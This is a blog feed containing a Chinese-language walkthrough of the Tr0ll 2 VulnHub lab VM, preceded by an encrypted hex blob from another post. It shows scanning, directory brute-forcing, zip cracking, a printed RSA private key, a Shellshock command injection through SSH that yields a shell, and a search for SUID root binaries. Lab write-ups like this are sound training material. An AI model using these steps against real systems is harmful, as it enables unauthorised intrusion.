7097cc7501dc0c5ba00a745ca578522d95c7dcc007b61bc869f56e6aab1fa0c0130e1166ce4b3402ee5f76414e822cd3d710c479771a743b5c0c34b9c538bba0ecb7f02dee3628eec6026bd45a099e0dffe45fb0d2b032b0ae15fc1856278ff3e664ab74e7a441918c138b84f86f15c981a67aca7448f8c9ed28c5ec45a91343c0cec13486df366942cf2a28009e5db59188bf64492af504c94b98eed7e8d1ffa26e7ab4c00dc5ff6d1e4966e762ec3de51d916e494d983dac6e7f5eb8111584316beccad2e9801a4b1441c58364e61bddd82a44743a53f3e7524a471804884fed292fed792c56982fac47b96a34efe73f0ad0f5fbd53026ce2b174c852a68d5e05625fe8c47a6c951c38ef5bc426362b49a4e1e5c03e5ba3a405a42c684dcf5d6625fe0b27697b9b8938b1a9036bf13e1e818de41d3715b830bc050a6bac08a07ad7c09d628409cc82d5faaa6ae814e052a748fb94cf850ba12d5db1e573b4cfd244dfbbd5cf9c83c3eeb8163accceceb2372651b17c892c194501337f8649849480aecaf7a37125ca6d490c227a75f2aadc89daed29be623cb487c9b9e53f7886a42772722ae680876b118214751bf8f8269817bc98705d0cead537d2c1bf4906f765bfabe87df0588be1fc21cb43bc5ec5d692649902552d156ab6ebf5df75ef8868b01c4f0604792435209358b404fdbd67bb77ca889cd2f9ef32b07d894a347ec0fd5f0c3651d839deec09ffedf5577bc7a81f2dd323c0cf62370ae688b0681f9475c5f142a2538026d1001ed5e1812927cc77d4f11a5343614379541e33eaf3329ad68e511428b2158380250a08fa56a7804c153d8c59e715d6f8801588a2610fba4dbadd32503dd8e80efb8b560dd58f3af449f23c906c37579e76ef5a6877c30139ed9de26d81889f19f5fbe6509e851c3cd3acae5deb9b606fefe35d6ab849c5251e8245362f3b4346ba7f299c68310ac61ba0a86a06ce4648d8dfaff5f1e87dbe81eb1b1457e77695e13c0051b76d573c7669cc8d6efb77969f3090a02a41c8450998b4c5a524621996929f7fab2dd47a2d6d3375e1feee7ff77d4adeb5c98581f2472b6189020380835fa774a4b80fd2e7477d7e27a744a0265f8a56f253b5883aae6fe97c9d2dfb55e6c4739abaa43fe20973dca1e58aab2b6a0e135bdda94de31cea5f27858713a3b3613a54c327c52348c503c91fd354d46e61d6fec081e3f6cd90cf071e513c230d57f444bb041692038a355cd9c7b450e709c928a8c99a77430fcaf2f8c91bb9d83ff18b27a4e0f377d26099d50d0e54e32e5affd271f94bf96acc626f381c29eaa4d9fb6d145f9129bd94c4ebd8d0d65b5b67b531baf5a52af61eed90910c79bf2655acbdb7a4a12c3eb6b441ff6560c447ef581c94c9ae8453907e4b3eb79fec4afdc9cd62164e4d71c2d0c5afe6723eab3a0543806b4ebb29c02b2e3351c68c124a721041e4110b7e58ba2748aa48a3fa0017de0ffb2654636c608417da3ac38104011390860732e7b6dfe2ce1a0b7834ca39d3eea8997adeb42368ccb4c4e9c003ba3993e84b22f3ce38c8cc3681cdb174668e7d1df1a6e40731beb84e671958419a72c9bcd3de991a077d9cbd8bffbb54c6b5938ffea6cd6146c5064c849b25e1ea1459265696f2b135af81e5a0174f7ca5ab70aa91e01c16a434c6c98d789518a1d66555d8581d70aaecb21786b596e8e5fa3bd01e5938f5edea01013efcb1a05a63f4c0773308f52a8b607320fa361d4aded168e638db2148a7e9bbb07eba6f4c32f66f0c3d28c0f4b415f56e8a53452d2dd37be22d0feea936f89d5f7f44730d37f2ecd3858904c4b31d96412b811fcd3ca0beb5800d742b51dd700b2c7a8e0bc062c983f2202177a3ed5f0f933148e1b1aa9d1334a0f5b0c0553303a22f29c5acf30057b3fa9ce6fe8027e30fd773059c75fbc0fe03f4703b6400aab193a83803b5c1c25c69b079b360bee31510e1a5ba41d007000a88916da806769153553a8c9cfe5b266c5fd9cf8eca15afb6b1b66a3533d4ae66583be409c9f865a0deb15bbb54be3763e4432d979f8e6522ed4e7018234b2393c1efae3e0cb46476b9128417c719c8c5e487cccdb4885bc1722cdf0b0468fa828f56504d79e1289d89ac25d761b8cadf8238978f7cd7ebd15d577d99dccee40588170f63451b3ebb4caab556bad83c0085fee40aa1d6ad3a7db3b12ec62e20b26ff27da815b71d81fd8b42717c36eb205dbf1bdfb0143886ce8cf229a0736886cb8b517d7ef5a2342a145e2b4f3dde4b4bde7889ef1d372216c4789092cbbcb0b0cfefd8110e4dcad631189bdc635e3c70462cd69a45fe6637abd18bc692af9f7d16259d56065f1342588bdec19487969f3ece7b393f184b890c0688fd9371d7dcda715455bea1936b14b1f2a16c3aea6f67e724de1f57a4fa78c8f8b4c77acc642953b466215f359b41d6624e32288d85af281e0eaea8e2f87a2c2aa3c17de52fa5b25cc1870c614102bff530461789be1fa8e3f70d7a4fbd87674dddf45aea5e2813fc5168e710358b6ae5ec184c324e04f632e3cb3ab84470be89b0cdc8bd271812d4182cceb2bd8d5c67765ae616b4aaf822029499493ddb06d69558f9241ea2d04d9e3a6631e5ad3d6a58774ab8548e0512446457dfa7e457eda87053706c5e3</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Tr0ll-2]</title>
    <url>/2020/04/01/Tr0ll-2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Tr0ll: 2<br>发布日期：2014年10月24日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Tr0ll2.rar</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbDIucmFy">https://download.vulnhub.com/tr0ll/Tr0ll2.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbDIucmFyLnRvcnJlbnQ=">https://download.vulnhub.com/tr0ll/Tr0ll2.rar.torrent<i class="fa fa-external-link-alt"></i></span> </li>
</ul>
<p>Tr0ll2_vbox.rar</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbDJfdmJveC5yYXI=">https://download.vulnhub.com/tr0ll/Tr0ll2_vbox.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbDJfdmJveC5yYXIudG9ycmVudA==">https://download.vulnhub.com/tr0ll/Tr0ll2_vbox.rar.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>Tr0ll系列VM中的第2台靶机。这比原始的Tr0ll难度有所提高，但是解决所需的时间大致相同，并且不会出错，巨魔仍然存在！:)</p>
<p>难度是从初学者到中级。</p>
<p>VM应该从DHCP提取有效IP。该VM已通过验证，可以在VMware工作站5，VMware Player 5，VMware Fusion和Virtual box上运行。virtual box用户可能需要启用附加的网卡才能拉出有效的IP地址。</p>
<p>特别感谢@ Eagle11，@ superkojiman和@leonjza经历了测试，并感谢freenode上#overflowsec的成员给了一些建议。如果机器有问题，请随时通过@ Maleus21或maleus overflowsecurity.com与我联系。-马累<span class="exturl" data-url="aHR0cDovL3d3dy5vdmVyZmxvd3NlY3VyaXR5LmNvbXRyMGxsMi5yYXIv">www.overflowsecurity.comTr0ll2.rar<i class="fa fa-external-link-alt"></i></span> = VMware，Tr0ll2_vbox.rar = VirtualBox</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.16</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">MAC Address: 00:0C:29:F7:66:43 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.66.16</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">MAC Address: 00:0C:29:F7:66:43 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 21,22,80 -A -v -T4 --script=vuln 192.168.66.16</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /robots.txt: Robots file</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.2.22: </span></span><br><span class="line"><span class="string">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span></span><br><span class="line"><span class="string">|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668</span></span><br><span class="line"><span class="string">|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169</span></span><br><span class="line"><span class="string">|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167</span></span><br><span class="line"><span class="string">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span></span><br><span class="line"><span class="string">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span></span><br><span class="line"><span class="string">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span></span><br><span class="line"><span class="string">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span></span><br><span class="line"><span class="string">|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704</span></span><br><span class="line"><span class="string">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span></span><br><span class="line"><span class="string">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span></span><br><span class="line"><span class="string">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span></span><br><span class="line"><span class="string">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span></span><br><span class="line"><span class="string">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span></span><br><span class="line"><span class="string">|_      CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span></span><br></pre></td></tr></table></figure>

<p>dirb目录爆破一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.66.16/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Tue Mar 31 23:19:58 2020</span><br><span class="line">URL_BASE: http://192.168.66.16/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.66.16/ ----</span><br><span class="line">+ http://192.168.66.16/cgi-bin/ (CODE:403|SIZE:289)                                                                       </span><br><span class="line">+ http://192.168.66.16/index (CODE:200|SIZE:110)                                                                          </span><br><span class="line">+ http://192.168.66.16/index.html (CODE:200|SIZE:110)                                                                     </span><br><span class="line">+ http://192.168.66.16/robots (CODE:200|SIZE:346)                                                                         </span><br><span class="line">+ http://192.168.66.16/robots.txt (CODE:200|SIZE:346)                                                                     </span><br><span class="line">+ http://192.168.66.16/server-status (CODE:403|SIZE:294)                                                                  </span><br><span class="line">                                                                                                                          </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Mar 31 23:20:04 2020</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 6</span><br></pre></td></tr></table></figure>

<p>查看robots.txt<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNjYuMTYvcm9ib3Rz">http://192.168.66.16/robots<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-agent:*</span><br><span class="line">Disallow:</span><br><span class="line">/noob</span><br><span class="line">/nope</span><br><span class="line">/try_harder</span><br><span class="line">/keep_trying</span><br><span class="line">/isnt_this_annoying</span><br><span class="line">/nothing_here</span><br><span class="line">/404</span><br><span class="line">/LOL_at_the_last_one</span><br><span class="line">/trolling_is_fun</span><br><span class="line">/zomg_is_this_it</span><br><span class="line">/you_found_me</span><br><span class="line">/I_know_this_sucks</span><br><span class="line">/You_could_give_up</span><br><span class="line">/dont_bother</span><br><span class="line">/will_it_ever_end</span><br><span class="line">/I_hope_you_scripted_this</span><br><span class="line">/ok_this_is_it</span><br><span class="line">/stop_whining</span><br><span class="line">/why_are_you_still_looking</span><br><span class="line">/just_quit</span><br><span class="line">/seriously_stop</span><br></pre></td></tr></table></figure>

<p>将/robots.txt中找到的所有路径添加到字典中，然后再次dirb。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># dirb http://192.168.66.16/ wordlist /usr/share/wordlists/dirb/common.txt</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Tue Mar 31 23:29:24 2020</span><br><span class="line">URL_BASE: http://192.168.66.16/</span><br><span class="line">WORDLIST_FILES: wordlist</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 21                                                            </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.66.16/ ----</span><br><span class="line">+ http://192.168.66.16//noob (CODE:301|SIZE:313)                                                                          </span><br><span class="line">+ http://192.168.66.16//keep_trying (CODE:301|SIZE:320)                                                                   </span><br><span class="line">+ http://192.168.66.16//dont_bother (CODE:301|SIZE:320)                                                                   </span><br><span class="line">+ http://192.168.66.16//ok_this_is_it (CODE:301|SIZE:322)                                                                 </span><br><span class="line">                                                                                                                          </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Mar 31 23:29:24 2020</span><br><span class="line">DOWNLOADED: 21 - FOUND: 4</span><br></pre></td></tr></table></figure>

<p>找到了4个目录，但除了HTML图像中的图像和注释之外，什么都没有。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;img src=<span class="string">&#x27;cat_the_troll.jpg&#x27;</span>&gt;</span><br><span class="line">&lt;!--What did you really think to find here? Try Harder!&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>对于目录，发现这是一张已导入到名为cat_the_troll.jpg的页面的图像，然后全部下载了它们。一开始没有发现任何差异，然后尝试检查所有jpg文件的MD5总和。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># md5sum *.jpg</span></span><br><span class="line">f094e16de91dae231812a2fb382d8803  dont_bother.jpg</span><br><span class="line">8e40e4bf4212b317788de52381072cd8  keep_trying.jpg</span><br><span class="line">8e40e4bf4212b317788de52381072cd8  noob.jpg</span><br><span class="line">8e40e4bf4212b317788de52381072cd8  ok_this_is_it.jpg</span><br><span class="line">973c57fc28ca1ce8703bdaf102f80370  tr0ll_again.jpg</span><br></pre></td></tr></table></figure>

<p>dont_bother.jpg具有不同的MD5哈希值，因此请看一下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># strings dont_bother.jpg </span></span><br><span class="line">JFIF</span><br><span class="line"><span class="comment">#3-652-108?QE8&lt;M=01F`GMTV[\[7DcjcXjQY[W</span></span><br><span class="line">)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW</span><br><span class="line">...</span><br><span class="line">Look Deep within y0ur_self <span class="keyword">for</span> the answer</span><br></pre></td></tr></table></figure>

<p>浏览器访问到<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNjYuMTYveTB1cl9zZWxmLyVFRiVCQyU4QyVFNiU4OSVCRSVFNSU4OCVCMCVFNCVCQSU4NiVFNCVCOCU4MCVFNCVCOCVBQSVFNSU5MCU4RCVFNCVCOCVCQWFuc3dlci50eHQlRTclOUElODQlRTYlOTYlODclRTQlQkIlQjYlRTMlODAlODIlRTclOUMlOEIlRTglQjUlQjclRTYlOUQlQTUlRTUlODMlOEYlRTQlQjglODAlRTQlQjglQUElRTUlQUYlODYlRTclQTAlODElRTYlOTYlODclRTQlQkIlQjYlRTMlODAlODIlRTQlQkQlODYlRTYlOTglQUYlRTYlQUYlOEYlRTQlQjglQUElRTUlQUYlODYlRTclQTAlODElRTklODMlQkQlRTclOTQlQThiYXNlNjQlRTclQkMlOTYlRTclQTAlODE=">http://192.168.66.16/y0ur_self/，找到了一个名为answer.txt的文件。看起来像一个密码文件。但是每个密码都用base64编码<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub233.jpg"></li>
</ul>
<p>answer.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">QQo=</span><br><span class="line">QQo=</span><br><span class="line">QUEK</span><br><span class="line">QUIK</span><br><span class="line">QUJNCg==</span><br><span class="line">QUMK</span><br><span class="line">QUNUSAo=</span><br><span class="line">QUkK</span><br><span class="line">QUlEUwo=</span><br><span class="line">QU0K</span><br><span class="line">QU9MCg==</span><br><span class="line">QU9MCg==</span><br><span class="line">QVNDSUkK</span><br><span class="line">QVNMCg==</span><br></pre></td></tr></table></figure>

<p>与Web服务无关。继续进行FTP服务。<br>使用Tr0ll作为用户名和密码登录很容易。找到了一个zip文件，并将其pull到Kali上，但该zip文件受密码保护。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub234.jpg"></li>
</ul>
<p>现在解码answer.txt文本中的base64加密字符串，并用作字典来解压缩zip文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat answer.txt | base64 --decode &gt; decoded_answer.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># fcrackzip -v -D -u -p decoded_answer.txt lmao.zip</span></span><br><span class="line">found file <span class="string">&#x27;noob&#x27;</span>, (size cp/uc   1300/  1679, flags 9, chk 1005)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL</span><br></pre></td></tr></table></figure>

<p>解压缩后查看压缩包内的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># unzip lmao.zip</span></span><br><span class="line">Archive:  lmao.zip</span><br><span class="line">[lmao.zip] noob password: </span><br><span class="line">  inflating: noob                    </span><br><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># ls -la</span></span><br><span class="line">总用量 2408</span><br><span class="line">drwxr-xr-x  2 root root    4096 4月   1 01:50 .</span><br><span class="line">drwxrwxrwx 11 root root    4096 3月  31 23:26 ..</span><br><span class="line">-rw-r--r--  1 root root 1412653 10月  4  2014 answer.txt</span><br><span class="line">-rw-r--r--  1 root root  886136 4月   1 01:47 decoded_answer.txt</span><br><span class="line">-rw-r--r--  1 root root   15873 4月   1 01:26 dont_bother.jpg</span><br><span class="line">-rw-r--r--  1 root root   15831 4月   1 01:26 keep_trying.jpg</span><br><span class="line">-rw-r--r--  1 root root    1474 4月   1 01:49 lmao.zip</span><br><span class="line">-rw-------  1 root root    1679 10月  4  2014 noob</span><br><span class="line">-rw-r--r--  1 root root   15831 4月   1 01:26 noob.jpg</span><br><span class="line">-rw-r--r--  1 root root   15831 4月   1 01:26 ok_this_is_it.jpg</span><br><span class="line">-rw-r--r--  1 root root   77438 4月   1 01:26 tr0ll_again.jpg</span><br><span class="line">-rw-r--r--  1 root root     322 3月  31 23:27 wordlist</span><br><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># cat noob</span></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq</span><br><span class="line">yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1</span><br><span class="line">/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo</span><br><span class="line">q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5</span><br><span class="line">z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy</span><br><span class="line">e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna</span><br><span class="line">u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0</span><br><span class="line">gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq</span><br><span class="line">UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079</span><br><span class="line">La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR</span><br><span class="line">xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP</span><br><span class="line">aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW</span><br><span class="line">K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx</span><br><span class="line">n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB</span><br><span class="line">TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh</span><br><span class="line">WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv</span><br><span class="line">ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t</span><br><span class="line">0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq</span><br><span class="line">vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh</span><br><span class="line">ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG</span><br><span class="line">th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s</span><br><span class="line">G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye</span><br><span class="line">q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO</span><br><span class="line">vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG</span><br><span class="line">zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>是的rsa私钥。查看SSH服务。因为文件名为noob，所以尝试使用用户noob和私钥登录SSH服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># ssh -i noob noob@192.168.66.16</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.66.16 (192.168.66.16)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:I3xuSgcBlIsoldKTkOyVYwx8B4NLGl0fDDTi0H6ExYg.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.66.16<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">TRY HARDER LOL!</span></span><br><span class="line"><span class="string">Connection to 192.168.66.16 closed.</span></span><br></pre></td></tr></table></figure>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>能够登录，但连接被关闭。有一段时间，Vulnhub于2014年10月24日发布了此易受攻击的操作系统。在此附近，存在一个漏洞可以绕过此漏洞</p>
<ul>
<li>参考<span class="exturl" data-url="aHR0cHM6Ly9yZXNvdXJjZXMuaW5mb3NlY2luc3RpdHV0ZS5jb20vcHJhY3RpY2FsLXNoZWxsc2hvY2stZXhwbG9pdGF0aW9uLXBhcnQtMi8jZ3JlZg==">SHELLSHOCK漏洞<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># ssh -i noob noob@192.168.66.16 &#x27;() &#123; :;&#125;; /bin/bash&#x27;</span></span><br><span class="line">id</span><br><span class="line">uid=1002(noob) gid=1002(noob) groups=1002(noob)</span><br><span class="line">whoami</span><br><span class="line">noob</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/noob</span><br></pre></td></tr></table></figure>

<p>现在有一个低权限shell。然后查看目录收集敏感信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd.img</span><br><span class="line">lib</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">nothing_to_see_here</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">selinux</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line"><span class="built_in">cd</span> nothing_to_see_here</span><br><span class="line">ls</span><br><span class="line">choose_wisely</span><br><span class="line"><span class="built_in">cd</span> choose_wisely</span><br><span class="line">ls</span><br><span class="line">door1</span><br><span class="line">door2</span><br><span class="line">door3</span><br><span class="line">ls -al *</span><br><span class="line">door1:</span><br><span class="line">total 16</span><br><span class="line">drwsr-xr-x 2 root root 4096 Oct  4  2014 .</span><br><span class="line">drwsr-xr-x 5 root root 4096 Oct  4  2014 ..</span><br><span class="line">-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t</span><br><span class="line"></span><br><span class="line">door2:</span><br><span class="line">total 16</span><br><span class="line">drwsr-xr-x 2 root root 4096 Oct  5  2014 .</span><br><span class="line">drwsr-xr-x 5 root root 4096 Oct  4  2014 ..</span><br><span class="line">-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t</span><br><span class="line"></span><br><span class="line">door3:</span><br><span class="line">total 20</span><br><span class="line">drwsr-xr-x 2 root root 4096 Oct  5  2014 .</span><br><span class="line">drwsr-xr-x 5 root root 4096 Oct  4  2014 ..</span><br><span class="line">-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t</span><br></pre></td></tr></table></figure>

<p>现在发现有设置SUID位的r00t二进制文件。认为必须利用这些二进制文件。</p>
